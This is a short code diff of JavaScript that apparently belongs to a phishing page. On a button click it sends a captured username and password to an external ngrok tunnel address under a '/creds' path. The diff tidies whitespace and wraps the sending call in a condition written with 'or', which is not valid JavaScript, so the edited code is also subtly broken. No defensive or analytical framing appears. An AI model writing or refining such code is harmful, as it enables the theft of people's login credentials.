@@ -40,11 +40,7 @@ function send_data(usuario, senha){
     .then(data => console.log(data))
     .catch(error => console.error(error));
 }
-
-
-                                  
-                                  
-                                  
+                               
 function teste_send(u, pwd){
    var xhr = new XMLHttpRequest();
     xhr.open("GET", "https://7e68-45-162-158-3.sa.ngrok.io/creds?user=" + u + "&pwd=" + pwd, true);
@@ -63,8 +59,7 @@ btn[1].addEventListener('click', function(){
         send_pwd();
     }, 3000);
     //teste_send(user)   
-    teste_send(user, pass);
+    if (user != undefined or pass != undefined or user != null or pass != null){
+        teste_send(user, pass);
+    }
 })
-
-
-
